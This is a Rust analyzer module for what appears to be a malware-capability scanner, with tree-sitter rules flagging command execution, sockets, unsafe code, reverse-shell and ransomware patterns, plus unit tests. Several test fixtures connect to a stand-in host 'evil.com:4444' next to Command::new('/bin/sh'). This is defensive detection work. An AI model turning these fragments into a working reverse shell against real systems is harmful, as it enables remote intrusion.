use crate::analyzers::Analyzer;
use crate::types::*;
use anyhow::{Context, Result};
use std::cell::RefCell;
use std::fs;
use std::path::Path;
use tree_sitter::Parser;

/// Rust analyzer using tree-sitter
pub struct RustAnalyzer {
    parser: RefCell<Parser>,
}

impl RustAnalyzer {
    pub fn new() -> Self {
        let mut parser = Parser::new();
        parser
            .set_language(&tree_sitter_rust::LANGUAGE.into())
            .unwrap();

        Self {
            parser: RefCell::new(parser),
        }
    }

    fn analyze_source(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();

        // Parse the Rust source
        let tree = self
            .parser
            .borrow_mut()
            .parse(content, None)
            .context("Failed to parse Rust source")?;

        let root = tree.root_node();

        // Create target info
        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: "rust".to_string(),
            size_bytes: content.len() as u64,
            sha256: self.calculate_sha256(content.as_bytes()),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        // Add structural feature
        report.structure.push(StructuralFeature {
            id: "source/language/rust".to_string(),
            description: "Rust source code".to_string(),
            evidence: vec![Evidence {
                method: "parser".to_string(),
                source: "tree-sitter-rust".to_string(),
                value: "rust".to_string(),
                location: Some("AST".to_string()),
            }],
        });

        // Detect capabilities and patterns
        self.detect_capabilities(&root, content.as_bytes(), &mut report);

        // Extract functions
        self.extract_functions(&root, content.as_bytes(), &mut report);

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec!["tree-sitter-rust".to_string()];

        Ok(report)
    }

    fn detect_capabilities(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = node.walk();
        self.walk_ast(&mut cursor, source, report);
    }

    fn walk_ast(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        loop {
            let node = cursor.node();

            match node.kind() {
                "call_expression" => {
                    self.analyze_call(&node, source, report);
                }
                "use_declaration" => {
                    self.analyze_import(&node, source, report);
                }
                "unsafe_block" => {
                    self.analyze_unsafe(&node, source, report);
                }
                "macro_invocation" => {
                    self.analyze_macro(&node, source, report);
                }
                "function_item" => {
                    // Will handle in extract_functions
                }
                _ => {}
            }

            // Recurse
            if cursor.goto_first_child() {
                self.walk_ast(cursor, source, report);
                cursor.goto_parent();
            }

            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn analyze_call(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        if let Ok(text) = node.utf8_text(source) {
            let mut capabilities = Vec::new();

            // Command execution
            if text.contains("Command::new") {
                capabilities.push((
                    "exec/command/shell",
                    "Executes shell commands",
                    "Command::new",
                    0.95,
                    Criticality::Notable,
                ));
            }

            // Network operations
            if text.contains("TcpStream::connect") {
                capabilities.push((
                    "net/socket/create",
                    "TCP connection",
                    "TcpStream::connect",
                    0.9,
                    Criticality::Notable,
                ));
            }
            if text.contains("TcpListener::bind") {
                capabilities.push((
                    "net/socket/server",
                    "TCP server",
                    "TcpListener::bind",
                    0.9,
                    Criticality::Notable,
                ));
            }

            // Note: fs/file/delete detection moved to traits/fs/file/delete/rust.yaml

            // Reverse shell pattern
            if (text.contains("TcpStream::connect") || text.contains("TcpStream"))
                && (text.contains("Command::new")
                    || text.contains("/bin/sh")
                    || text.contains("cmd.exe"))
            {
                capabilities.push((
                    "c2/reverse-shell",
                    "Reverse shell connection",
                    "TcpStream+Command",
                    0.98,
                    Criticality::Hostile,
                ));
            }

            // Ransomware indicators
            if (text.contains("aes") || text.contains("cipher"))
                && (text.contains("walkdir") || text.contains("read_dir"))
            {
                capabilities.push((
                    "crypto/ransomware/encrypt",
                    "File encryption pattern",
                    "crypto+walk",
                    0.92,
                    Criticality::Hostile,
                ));
            }

            // Add capabilities
            for (cap_id, desc, method, conf, criticality) in capabilities {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: cap_id.to_string(),
                    description: desc.to_string(),
                    confidence: conf,
                    criticality,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "ast".to_string(),
                        source: "tree-sitter-rust".to_string(),
                        value: method.to_string(),
                        location: Some(format!(
                            "{}:{}",
                            node.start_position().row,
                            node.start_position().column
                        )),
                    }],
                });
            }
        }
    }

    fn analyze_import(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        if let Ok(text) = node.utf8_text(source) {
            let mut capabilities = Vec::new();

            if text.contains("std::process") || text.contains("std::process::Command") {
                capabilities.push((
                    "exec/command/shell",
                    "Process execution import",
                    "std::process",
                    0.8,
                    Criticality::Notable,
                ));
            }
            if text.contains("std::net") {
                capabilities.push((
                    "net/socket/create",
                    "Network import",
                    "std::net",
                    0.7,
                    Criticality::Notable,
                ));
            }
            if text.contains("libc") {
                capabilities.push((
                    "exec/syscall",
                    "Low-level system calls",
                    "libc",
                    0.8,
                    Criticality::Notable,
                ));
            }
            if text.contains("libloading") || text.contains("dlopen") {
                capabilities.push((
                    "exec/dylib/load",
                    "Dynamic library loading",
                    "libloading",
                    0.9,
                    Criticality::Notable,
                ));
            }

            for (cap_id, desc, method, conf, criticality) in capabilities {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: cap_id.to_string(),
                    description: desc.to_string(),
                    confidence: conf,
                    criticality,
                    mbc: None,
                    attack: None,
                    evidence: vec![Evidence {
                        method: "import".to_string(),
                        source: "tree-sitter-rust".to_string(),
                        value: method.to_string(),
                        location: Some(format!(
                            "{}:{}",
                            node.start_position().row,
                            node.start_position().column
                        )),
                    }],
                });
            }
        }
    }

    fn analyze_unsafe(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        if let Ok(text) = node.utf8_text(source) {
            // Any unsafe block is noteworthy
            report.findings.push(Finding {
                kind: FindingKind::Capability,
                trait_refs: vec![],
                id: "unsafe/block".to_string(),
                description: "Unsafe code block".to_string(),
                confidence: 1.0,
                criticality: Criticality::Notable,

                mbc: None,

                attack: None,

                evidence: vec![Evidence {
                    method: "ast".to_string(),
                    source: "tree-sitter-rust".to_string(),
                    value: "unsafe block".to_string(),
                    location: Some(format!(
                        "{}:{}",
                        node.start_position().row,
                        node.start_position().column
                    )),
                }],
            });

            // Check for specific unsafe operations
            if text.contains("transmute") {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: "unsafe/transmute".to_string(),
                    description: "Type transmutation (unsafe cast)".to_string(),
                    confidence: 0.95,
                    criticality: Criticality::Notable,

                    mbc: None,

                    attack: None,

                    evidence: vec![Evidence {
                        method: "ast".to_string(),
                        source: "tree-sitter-rust".to_string(),
                        value: "transmute".to_string(),
                        location: Some(format!(
                            "{}:{}",
                            node.start_position().row,
                            node.start_position().column
                        )),
                    }],
                });
            }

            if text.contains("*const") || text.contains("*mut") {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: "unsafe/pointer".to_string(),
                    description: "Raw pointer operations".to_string(),
                    confidence: 0.9,
                    criticality: Criticality::Notable,

                    mbc: None,

                    attack: None,

                    evidence: vec![Evidence {
                        method: "ast".to_string(),
                        source: "tree-sitter-rust".to_string(),
                        value: "raw pointers".to_string(),
                        location: Some(format!(
                            "{}:{}",
                            node.start_position().row,
                            node.start_position().column
                        )),
                    }],
                });
            }

            if text.contains("asm!") || text.contains("global_asm!") {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: "unsafe/inline-asm".to_string(),
                    description: "Inline assembly".to_string(),
                    confidence: 1.0,
                    criticality: Criticality::Notable,

                    mbc: None,

                    attack: None,

                    evidence: vec![Evidence {
                        method: "ast".to_string(),
                        source: "tree-sitter-rust".to_string(),
                        value: "asm!".to_string(),
                        location: Some(format!(
                            "{}:{}",
                            node.start_position().row,
                            node.start_position().column
                        )),
                    }],
                });
            }

            // FFI detection
            if text.contains("extern \"C\"") || text.contains("extern \"system\"") {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: "unsafe/ffi".to_string(),
                    description: "Foreign function interface (C boundary)".to_string(),
                    confidence: 0.95,
                    criticality: Criticality::Notable,

                    mbc: None,

                    attack: None,

                    evidence: vec![Evidence {
                        method: "ast".to_string(),
                        source: "tree-sitter-rust".to_string(),
                        value: "extern".to_string(),
                        location: Some(format!(
                            "{}:{}",
                            node.start_position().row,
                            node.start_position().column
                        )),
                    }],
                });
            }
        }
    }

    fn analyze_macro(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
        if let Ok(text) = node.utf8_text(source) {
            if text.contains("asm!") || text.contains("global_asm!") {
                report.findings.push(Finding {
                    kind: FindingKind::Capability,
                    trait_refs: vec![],
                    id: "unsafe/inline-asm".to_string(),
                    description: "Inline assembly macro".to_string(),
                    confidence: 1.0,
                    criticality: Criticality::Notable,

                    mbc: None,

                    attack: None,

                    evidence: vec![Evidence {
                        method: "ast".to_string(),
                        source: "tree-sitter-rust".to_string(),
                        value: text.split('!').next().unwrap_or("asm").to_string(),
                        location: Some(format!(
                            "{}:{}",
                            node.start_position().row,
                            node.start_position().column
                        )),
                    }],
                });
            }
        }
    }

    fn extract_functions(
        &self,
        node: &tree_sitter::Node,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = node.walk();
        self.walk_for_functions(&mut cursor, source, report);
    }

    fn walk_for_functions(
        &self,
        cursor: &mut tree_sitter::TreeCursor,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        loop {
            let node = cursor.node();

            if node.kind() == "function_item" {
                if let Ok(_text) = node.utf8_text(source) {
                    // Extract function name
                    let name = self
                        .extract_function_name(&node, source)
                        .unwrap_or_else(|| "anonymous".to_string());

                    report.functions.push(Function {
                        name,
                        offset: Some(format!("0x{:x}", node.start_byte())),
                        size: Some((node.end_byte() - node.start_byte()) as u64),
                        complexity: None,
                        calls: Vec::new(),
                        source: "tree-sitter-rust".to_string(),
                        control_flow: None,
                        instruction_analysis: None,
                        register_usage: None,
                        constants: Vec::new(),
                        properties: None,
                        signature: None,
                        nesting: None,
                        call_patterns: None,
                    });
                }
            }

            // Recurse
            if cursor.goto_first_child() {
                self.walk_for_functions(cursor, source, report);
                cursor.goto_parent();
            }

            if !cursor.goto_next_sibling() {
                break;
            }
        }
    }

    fn extract_function_name(&self, node: &tree_sitter::Node, source: &[u8]) -> Option<String> {
        let mut cursor = node.walk();
        if cursor.goto_first_child() {
            loop {
                let child = cursor.node();
                if child.kind() == "identifier" {
                    return child.utf8_text(source).ok().map(|s| s.to_string());
                }
                if !cursor.goto_next_sibling() {
                    break;
                }
            }
        }
        None
    }

    fn calculate_sha256(&self, data: &[u8]) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(data);
        format!("{:x}", hasher.finalize())
    }
}

impl Analyzer for RustAnalyzer {
    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        let content = fs::read_to_string(file_path)?;
        self.analyze_source(file_path, &content)
    }

    fn can_analyze(&self, file_path: &Path) -> bool {
        file_path.extension().and_then(|e| e.to_str()) == Some("rs")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn analyze_rust_code(code: &str) -> AnalysisReport {
        let analyzer = RustAnalyzer::new();
        let path = PathBuf::from("test.rs");
        analyzer.analyze_source(&path, code).unwrap()
    }

    #[test]
    fn test_can_analyze_rs_extension() {
        let analyzer = RustAnalyzer::new();
        assert!(analyzer.can_analyze(&PathBuf::from("test.rs")));
        assert!(analyzer.can_analyze(&PathBuf::from("/path/to/main.rs")));
    }

    #[test]
    fn test_cannot_analyze_other_extension() {
        let analyzer = RustAnalyzer::new();
        assert!(!analyzer.can_analyze(&PathBuf::from("test.c")));
        assert!(!analyzer.can_analyze(&PathBuf::from("test.py")));
    }

    #[test]
    fn test_structural_feature() {
        let code = r#"
fn main() {
    println!("Hello, world!");
}
"#;
        let report = analyze_rust_code(code);
        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "source/language/rust"));
    }

    #[test]
    fn test_detect_command_new() {
        let code = r#"
use std::process::Command;
fn main() {
    Command::new("whoami").spawn().unwrap();
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_tcpstream_connect() {
        let code = r#"
use std::net::TcpStream;
fn main() {
    let stream = TcpStream::connect("evil.com:4444").unwrap();
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
    }

    #[test]
    fn test_detect_tcplistener_bind() {
        let code = r#"
use std::net::TcpListener;
fn main() {
    let listener = TcpListener::bind("127.0.0.1:8080").unwrap();
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/server"));
    }

    // Note: fs/file/delete detection moved to traits/fs/file/delete/rust.yaml

    #[test]
    fn test_detect_unsafe_block() {
        let code = r#"
fn main() {
    unsafe {
        let x = 42;
    }
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "unsafe/block"));
    }

    #[test]
    fn test_detect_transmute() {
        let code = r#"
use std::mem;
fn main() {
    unsafe {
        let x: u32 = mem::transmute(42.0f32);
    }
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "unsafe/transmute"));
    }

    #[test]
    fn test_detect_raw_pointers() {
        let code = r#"
fn main() {
    unsafe {
        let ptr: *const i32 = &42;
        let mut_ptr: *mut i32 = &mut 42;
    }
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "unsafe/pointer"));
    }

    #[test]
    fn test_detect_inline_asm() {
        let code = r#"
use std::arch::asm;
fn main() {
    unsafe {
        asm!("nop");
    }
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "unsafe/inline-asm"));
    }

    #[test]
    fn test_import_std_process() {
        let code = r#"
use std::process::Command;
fn main() {}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_import_std_net() {
        let code = r#"
use std::net::TcpStream;
fn main() {}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
    }

    #[test]
    fn test_import_libc() {
        let code = r#"
use libc::fork;
fn main() {}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/syscall"));
    }

    #[test]
    fn test_import_libloading() {
        let code = r#"
use libloading::Library;
fn main() {}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/dylib/load"));
    }

    #[test]
    fn test_extract_functions() {
        let code = r#"
fn function_one() {
    println!("one");
}

fn function_two(x: i32) -> i32 {
    x + 1
}
"#;
        let report = analyze_rust_code(code);
        assert_eq!(report.functions.len(), 2);
        assert!(report.functions.iter().any(|f| f.name == "function_one"));
        assert!(report.functions.iter().any(|f| f.name == "function_two"));
    }

    #[test]
    fn test_multiple_capabilities() {
        let code = r#"
use std::process::Command;
use std::net::TcpStream;
fn main() {
    let stream = TcpStream::connect("evil.com:4444").unwrap();
    Command::new("/bin/sh").spawn().unwrap();
    unsafe {
        let ptr: *const i32 = &42;
    }
}
"#;
        let report = analyze_rust_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
        assert!(report.findings.iter().any(|c| c.id == "unsafe/block"));
        assert!(report.findings.len() >= 3);
    }
}
